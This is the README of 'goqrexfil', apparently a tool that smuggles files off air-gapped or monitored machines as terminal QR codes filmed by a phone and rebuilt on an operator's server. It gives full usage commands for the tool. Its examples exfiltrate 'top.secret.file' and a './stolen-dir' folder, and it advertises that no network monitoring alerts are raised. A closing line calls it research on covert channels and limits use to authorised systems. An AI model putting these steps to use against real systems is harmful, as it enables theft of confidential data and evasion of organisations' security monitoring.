# goqrexfil

Exfiltrate data as **QR codes captured on video** — a cover channel that never touches the
network.

The idea: data leaves the air-gapped (or monitored) machine by being *looked at*. A client
renders the payload as a stream of QR codes **directly in your terminal**; a phone records
them on video; the video is uploaded to a server you control, which extracts the frames,
reads every QR code, and reconstructs the original file. No packets, no USB, no network
monitoring alerts — just a video file that looks like any other.

The pipeline is protected by **RaptorQ fountain coding** (erasure coding): the client emits
more symbols than are strictly needed, so the server can reconstruct the payload even when
the video drops frames — no re-recording required in the common case.

```
              client (monitored machine)                        server (your machine)
              ──────────────────────────                        ──────────────────────
  file / dir / stdin
        │
        ▼
  smaz compress ──► RaptorQ encode ──► symbol stream (k base + redundancy)
                                                        │
                                          each symbol framed + rendered as a
                                          QR code in the terminal (half-blocks)
                                                        │
                                              ┌─────────▼──────────┐
                                              │  symbol #1         │   ◄── phone films
                                              │  symbol #2         │       the terminal
                                              │  ...               │
                                              └─────────┬──────────┘
                                                        │  video upload (http/https)
                                                        ▼
                                     ffmpeg frame extraction ──► QR recognition (per frame)
                                                        │
                                          RaptorQ decode (any solvable subset)
                                                        │
                                              smaz decompress
                                                        │
                                                        ▼
                                                  payload.bin  ✓   (or extracted/ dir)
```

## Requirements

* [Go](https://go.dev) 1.26+
* [ffmpeg](https://ffmpeg.org) on `PATH` (server mode only)
* A phone and a steady hand (client mode)
* A terminal with a **monospace font** — QR codes are drawn with Unicode half-blocks
  (`█▀▄`), so no browser is needed

## Build

```sh
go build -o goqrexfil .
```

## Quick start

**1. Start the server** on a machine you control:

```sh
./goqrexfil --server                 # http://<server>:9999
./goqrexfil --server --token SECRET  # require a shared token
./goqrexfil --server --tls           # HTTPS with a self-signed cert (fingerprint printed)
```

**2. Record the QR stream** on the monitored machine. Point your phone at the terminal
(zoom so the QR fills most of the frame), start recording, wait for the stream, stop:

```sh
cat top.secret.file | ./goqrexfil --client
[*] Client mode: ON
[*] Source: stdin (8.2 KiB)
Plaintext hash 9f2c...
[*] 38 base symbols, 57 total (redundancy 50%)
[*] Estimated recording time: ~31s
[***] Point your phone at this terminal, start recording, then in > 3 < seconds ****
```

**3. Upload the video** from your phone to `http://<server>:9999/` (add `?token=SECRET`
if you set one) and submit. The server reconstructs as soon as it has enough symbols and
responds with a download link:

```
[*] File received
[*] received 25 symbols (need ~38)
[*] Payload reconstructed from 41 symbols (need ~38)
[*] Payload saved as  ./payload/payload.bin
Payload hash 9f2c...
```

Compare the `Plaintext hash` from step 2 with the `Payload hash` from step 3 — they must
match. Then download the file from `http://<server>:9999/payload`.

## Why it's reliable: fountain coding

Each QR code is a **RaptorQ symbol**, not a fixed chunk. The client emits `k` base symbols
plus a redundancy pool (default 50%), and the server can reconstruct the payload from
**any** solvable subset of the symbols it captured. That means:

* Dropped frames, motion blur, and missed QRs are absorbed by the redundancy — a typical
  recording reconstructs on the first try.
* The server shows live progress (`received N symbols (need ~k)`) and **stops scanning as
  soon as the payload is decodable**, instead of processing the whole video.
* If a recording genuinely captured too little, the server tells you — just re-record.
  Because it's a fountain code, *any* additional symbols help, so there's no "re-record
  chunks 4, 8, 12" bookkeeping.

Tune the trade-off with `--redundancy` (percent of base symbols): higher = longer video but
more tolerant of a bad recording.

```sh
./goqrexfil --client --redundancy 100 top.secret.file   # very robust, ~2x longer
```

## Directory and multi-file exfiltration

Point the client at a directory and it packs everything into a tar.gz with a SHA-256
manifest; the server unpacks it to `./payload/extracted/` and verifies every file against
the manifest:

```sh
./goqrexfil --client ./stolen-dir
[*] Source: stolen-dir (1.2 MiB)
[*] 5120 base symbols, 7680 total (redundancy 50%)
[*] Estimated recording time: ~4224s
```

A single file works the same way: `./goqrexfil --client ./top.secret.pdf`.

**Preview before you record** with `--dry-run` (shows size, symbol count, and time
estimate, displays nothing):

```sh
./goqrexfil --client --dry-run ./stolen-dir
```

## Self-test (no camera needed)

Verify the whole encode → QR → decode → RaptorQ-reconstruct pipeline locally. It simulates
an 80% capture and confirms the payload still reconstructs:

```sh
cat top.secret.file | ./goqrexfil --selftest
[*] 26 base symbols, 39 total
[*] PASS: round-trip OK from 80% of symbols, payload hash 9f2c...
```

The repo ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR frames
and run the full server pipeline — including a test that **drops 25% of the symbols and
still reconstructs the payload**:

```sh
go test ./...
```

## Reference

### Flags

| Flag | Description |
| --- | --- |
| `--client [path]` | Read payload from `path` (file or directory) or stdin, display QR stream |
| `--client --dry-run` | Show symbol count + time estimate, display nothing |
| `--client --redundancy N` | RaptorQ redundancy as % of base symbols (default 50) |
| `--client --no-quiet-zone` | Omit the QR quiet zone to save 8 columns (narrow terminals) |
| `--server` | Web server on port 9999: upload video, reconstruct payload |
| `--server --token SECRET` | Require the shared token on upload/download |
| `--server --tls` | Serve over TLS (self-signed cert, fingerprint printed) |
| `--server --tls-cert C --tls-key K` | Use your own TLS cert/key |
| `--selftest [path]` | Local round-trip test of the QR pipeline, no camera needed |
| `--retrievePayload` | Re-process `./public/video.mp4` without the web server (debug) |

### Server endpoints

| Endpoint | Description |
| --- | --- |
| `GET /` | Upload form (add `?token=…` if a token is set) |
| `POST /upload` | Upload the video (multipart field `file`, max 512 MB); returns download link or a "re-record" notice |
| `GET /payload` | Download the reconstructed payload |
| `GET /missing` | Advisory: how the fountain-coded recovery works |
| `GET /process/` | Static access to extracted frames (debugging) |

### The symbol protocol

Each QR code encodes `GQ2:<compressedLen>:<symbolID>:<base64(symbol)>` where
`<compressedLen>` is the exact byte length of the smaz-compressed payload (the RaptorQ
decoder needs it), `<symbolID>` indexes the fountain symbol, and `<base64(symbol)>` is a
~240-byte RaptorQ symbol. The `:` separators cannot appear in base64, so framing is
unambiguous.

## Throughput

Each QR carries a 240-byte symbol held for 550 ms, and 50% redundancy means you emit 1.5
symbols per base symbol. RaptorQ pads the symbol count, so treat these as **approximate
worst-case** (incompressible data) figures — run `--dry-run` for the exact count and time
for your payload:

| Original size | Total symbols (approx) | Recording time (approx) |
| --- | --- | --- |
| 1 KB | ~9 | ~5 s |
| 10 KB | ~77 | ~42 s |
| 100 KB | ~770 | ~7 min |
| 1 MB | ~7,900 | ~70 min |
| 10 MB | ~79,000 | ~12 h |

Compressible payloads (text, PDFs, source) shrink under smaz and transfer proportionally
faster. Lower `--redundancy` shortens the video at the cost of less tolerance for a bad
recording.

## Tuning

Constants at the top of `goqrexfil.go`:

* `symbolSize` — bytes per RaptorQ symbol (240 → ~320 base64 chars per QR). Changing it
  alters QR density; run `--selftest` after changing it.
* `msBetweenFrames` — dwell time per symbol (550 ms). Raise it if your phone drops frames.
* `ffmpegImageScale` — frames are extracted at native resolution, capped at 1600 px wide
  for 4K video. Never downscale below ~600 px: QR recognition fails below that.

## Limitations

* The server is plain HTTP by default with no authentication — use `--token` and/or `--tls`
  before pointing it at anything but a trusted network, and stop it when done.
* Recognition quality depends on the recording: steady hand, good lighting, QR filling the
  frame, monospace terminal font. Fountain coding absorbs some loss, but a very bad
  recording may still need a re-take.
* This is a research/education project about cover channels. Use it only on systems you own
  or are authorized to test.

## License

See [LICENSE](LICENSE).
